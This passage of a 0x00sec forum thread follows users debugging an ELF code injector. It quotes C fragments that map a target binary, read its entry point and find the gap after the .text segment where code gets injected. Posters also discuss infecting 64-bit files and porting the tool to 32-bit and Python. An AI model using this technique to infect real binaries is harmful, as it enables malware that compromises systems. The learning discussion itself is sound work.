<div class="post" itemprop="text">
<p>Thanks for the catch on the code. It’s fixed!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-08T21:26:52Z" class="post-time">
June 8, 2016, 9:26pm
</time>
<meta itemprop="dateModified" content="2016-06-08T21:26:52Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Ok so I figured out what every line of code does and I’m stunned.<br>
This is amazing man so many props.<br>
mmaping, typecasting as Elf header struct, I never thought something like that would be possible.<br>
Thanks for keeping the fun in my pursuit in gaining knowledge <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"><br>
<em>tbh I had a small crisis of faith in my pursuit lately</em><br>
Few questions though:</p>
<pre><code class="lang-auto">   if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC,
		    MAP_SHARED, fd, 0)) == MAP_FAILED)
    {
      perror ("mmap:");
      exit (1);
    }
</code></pre>
<p>Here you mmap the file to *data.<br>
Which you then here:</p>
<pre><code class="lang-auto">  /* Get Application Entry point */
  elf_hdr = (Elf64_Ehdr *) d;
  ep = elf_hdr-&gt;e_entry;
  printf ("+ Target Entry point: %p\n", (void*) ep);
</code></pre>
<p>typecast as Elf64_Ehdr</p>
<p>So does this work, because mmap begins from the start of the file, where the magic happens?<br>
Because that realization is just mindblowing.</p>
<p>Alright I’m gonna let all of this sink in and try to find why it doesnt work sometimes.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-08T21:37:36Z" class="post-time">
June 8, 2016, 9:37pm
</time>
<meta itemprop="dateModified" content="2016-06-08T21:37:36Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group" data-username="unh0lys0da" data-post="7" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
unh0lys0da:</div>
<blockquote>
<p>So does this work, because mmap begins from the start of the file, where the magic happens?Because that realization is just mindblowing.</p>
</blockquote>
</aside>
<p>Yes, you will get the same, if you open the file normally and just read the first bytes in a <code>Elf64_Ehdr</code> variable.</p>
<p>I’m looking forward to your findings. It looks to be related to <code>PIE</code> code… but it may just be something stupid…</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-08T22:35:45Z" class="post-time">
June 8, 2016, 10:35pm
</time>
<meta itemprop="dateModified" content="2016-06-08T22:35:45Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I’ll also work on 32bit support, might this be a cause for the issue?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-09T04:46:39Z" class="post-time">
June 9, 2016, 4:46am
</time>
<meta itemprop="dateModified" content="2016-06-09T04:46:39Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Then you need to use the 32bits structures… there are some differences between both… basically change 64 to 32 in all the data structures (e.g. <code>Elf64_Ehdr</code> -&gt; <code>Elf32_Ehdr</code>).</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-09T15:30:39Z" class="post-time">
June 9, 2016, 3:30pm
</time>
<meta itemprop="dateModified" content="2016-06-09T15:30:39Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>That’s one way, the thing is, I want to let the program check what architecture it is, by typecasting data as an array first and see what arr[4]'s value is (e_ident[EI_CLASS]). So that it would work on both 32 bit and 64 bit.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/oaktree"><span itemprop="name">oaktree</span></a>
(oaktree)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-09T15:35:34Z" class="post-time">
June 9, 2016, 3:35pm
</time>
<meta itemprop="dateModified" content="2016-06-09T15:35:34Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Why not use <code>#ifndef</code> stuff?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-09T15:58:49Z" class="post-time">
June 9, 2016, 3:58pm
</time>
<meta itemprop="dateModified" content="2016-06-09T21:52:52Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Because it would determin on runtime, it’s not about the injector, it’s about the target file.<br>
<a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> Would it be possible to infect 64 bit files, if I’d compile this injector as a 32 bit ELF binary?<br>
I maybe found some bugs:</p>
<pre><code class="lang-auto">  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr 
			    + (unsigned int) elf_hdr-&gt;e_phoff);
</code></pre>
<p>Here <code>(unsigned int)</code> is a 32 bit value, could it be possible that e_phoff exceeds 0xffffffff ?</p>
<p>also, shouldnt:</p>
<pre><code class="lang-auto">if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; elf_seg-&gt;p_flags &amp; 0x011)
</code></pre>
<p>be:</p>
<pre><code class="lang-auto">if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; ~(elf_seg-&gt;p_flags ^ 0x5)
</code></pre>
<p>Considering:<br>
<code>PF_X = 0x1 PF_W = 0x2 PF_R = 0x4</code><br>
&amp; 0x11, would only hold true for PF_X. Or is .text always the first executable segment it will find?</p>
<p>And I have a question about the following:</p>
<pre><code class="lang-auto">  for (i = 0; i &lt; n_seg; i++)
    {
      if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; elf_seg-&gt;p_flags &amp; 0x011)
	{
	  printf ("+ Found .text segment (#%d)\n", i);
	  text_seg = elf_seg;
	  text_end = elf_seg-&gt;p_offset + elf_seg-&gt;p_filesz;
	}
      else
	{
	  if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; 
	      (elf_seg-&gt;p_offset - text_end) &lt; gap) 
	    {
	      printf ("   * Found LOAD segment (#%d) close to .text (offset: 0x%x)\n",
		      i, (unsigned int)elf_seg-&gt;p_offset);
	      gap = elf_seg-&gt;p_offset - text_end;
	    }
	}
      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg 
			    + (unsigned int) elf_hdr-&gt;e_phentsize);
    }
</code></pre>
<p>At the end of each iteration, the elf_seg pointer gets incremented.<br>
that means it points to the struct Elf64_Phdr, + some additional.<br>
This seems counterintuitive to me because if:</p>
<pre><code class="lang-auto">| member0 | ... | memberx | ... | member n | ... | member n+x | ...
   └─strct strct-&gt;a──┘               │                   │
 after m iterations: strct───────────┘ strct-&gt;a──────────┘
</code></pre>
<p>So if you’d increment the pointer, wouldn’t that cause it to no longer point to the first member of the struct. And wouldn’t that cause that adressing members goes wrong?</p>
<p>Nvm I’m being stupid, shouldve checked the manpage properly ^^<br>
<em><strong>e_phentsize</strong> This member holds the size in bytes of one entry in the file’s program header table; all entries are the same size.</em><br>
So it does indeed increment the pointer of the struct to such extends that it actually does point to a new struct (entry) in the file<br>
Awesome ^^</p>
<p>Another question (I just keep 'em coming):<br>
Why are we looking for the smallest gap, instead of the biggest?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-10T05:28:25Z" class="post-time">
June 10, 2016, 5:28am
</time>
<meta itemprop="dateModified" content="2016-06-10T05:28:25Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>That is indeed possible. I just chose 64bits in the post to keep it simple, but indeed, a proper program should work with both architectures… I’m looking forward to your version of the injector!!!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-10T05:39:34Z" class="post-time">
June 10, 2016, 5:39am
</time>
<meta itemprop="dateModified" content="2016-06-10T05:39:34Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group" data-username="unh0lys0da" data-post="13" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
unh0lys0da:</div>
<blockquote>
<p>Would it be possible to infect 64 bit files, if I’d compile this injector as a 32 bit ELF binary?</p>
</blockquote>
</aside>
<p>Sure. We are just changing bytes in a file.</p>
<aside class="quote no-group" data-username="unh0lys0da" data-post="13" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
unh0lys0da:</div>
<blockquote>
<p>Here (unsigned int) is a 32 bit value, could it be possible that e_phoff exceeds 0xffffffff ?</p>
</blockquote>
</aside>
<p>If you check the structure in the <code>elf.h</code> it is actuall 16bits.</p>
<aside class="quote no-group" data-username="unh0lys0da" data-post="13" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
unh0lys0da:</div>
<blockquote>
<p>&amp; 0x11, would only hold true for PF_X. Or is .text always the first executable segment it will find?</p>
</blockquote>
</aside>
<p>I think you are right with this. have you tried the modification?. I will take a look later but looks like you are right.</p>
<aside class="quote no-group" data-username="unh0lys0da" data-post="13" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
unh0lys0da:</div>
<blockquote>
<p>Why are we looking for the smallest gap, instead of the biggest?</p>
</blockquote>
</aside>
<p>Well, that code is not the best in the world. This injector always adds the code at the end of the <code>.text</code> segment, so the gap we are looking for in that function is the one from the end of the <code>.text</code> section to the beginning, of whatever other sections comes after. As I didn’t know if the <code>.data</code> segment is always the next section, I just calculate the gap for every single section in the file, and I keep the smaller as that is the one between <code>.text</code> segment and <code>.XXX</code> next segment in memory.</p>
<p>Sorry for the poor wording of this explanation… Let me know if I manage to explain it <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_16" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-11T00:05:17Z" class="post-time">
June 11, 2016, 12:05am
</time>
<meta itemprop="dateModified" content="2016-06-11T00:05:17Z">
<span itemprop="position">16</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group" data-username="0x00pf" data-post="15" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>Well, that code is not the best in the world. This injector always adds the code at the end of the .text segment, so the gap we are looking for in that function is the one from the end of the .text section to the beginning, of whatever other sections comes after. As I didn’t know if the .data segment is always the next section, I just calculate the gap for every single section in the file, and I keep the smaller as that is the one between .text segment and .XXX next segment in memory.</p>
<p>Sorry for the poor wording of this explanation… Let me know if I manage to explain it <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</blockquote>
</aside>
<p>Yes I get it <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>About the modification, I’ll try it right now, see if it makes a difference ^^</p>
<p>I’ll also try to implement the 32 and 64 bit stuff.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_17" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-14T21:35:39Z" class="post-time">
June 14, 2016, 9:35pm
</time>
<meta itemprop="dateModified" content="2016-06-14T21:35:39Z">
<span itemprop="position">17</span>
</span>
</div>
<div class="post" itemprop="text">
<p>So far I have this:<br>
<a href="http://pastebin.com/DywNNiw2" class="onebox" target="_blank" rel="nofollow noopener">http://pastebin.com/DywNNiw2</a></p>
<p>Though there are some issues ^_^’<br>
Think I there are some pointer issues.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_18" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-14T21:43:03Z" class="post-time">
June 14, 2016, 9:43pm
</time>
<meta itemprop="dateModified" content="2016-06-14T21:43:03Z">
<span itemprop="position">18</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Make another post and link this post!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_19" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-15T06:51:59Z" class="post-time">
June 15, 2016, 6:51am
</time>
<meta itemprop="dateModified" content="2016-06-15T06:51:59Z">
<span itemprop="position">19</span>
</span>
</div>
<div class="post" itemprop="text">
<p>At first glance it looks good!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../extracting-a-payload/667.html">Extracting a Payload</a>
<meta itemprop="position" content="1">
</div>
</div>
</div>
<div id="post_20" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00_Jinx"><span itemprop="name">0x00_Jinx</span></a>
(0x00Jinx)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-06-28T03:07:55Z" class="post-time">
June 28, 2016, 3:07am
</time>
<meta itemprop="dateModified" content="2016-06-28T03:07:55Z">
<span itemprop="position">20</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I got bored so I used your code to create a Python module out of this. The code is on <a href="http://pastebin.com/PsQMFE1s" rel="nofollow noopener">Pastebin</a> The instructions are included in the source code in the comment at the top along with an example.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
</div>
<div role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement" class="topic-body crawler-post">
<span itemprop="name"><b><a rel="next" itemprop="url" href="410%3Fpage=2.html">next page →</a></b></span>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
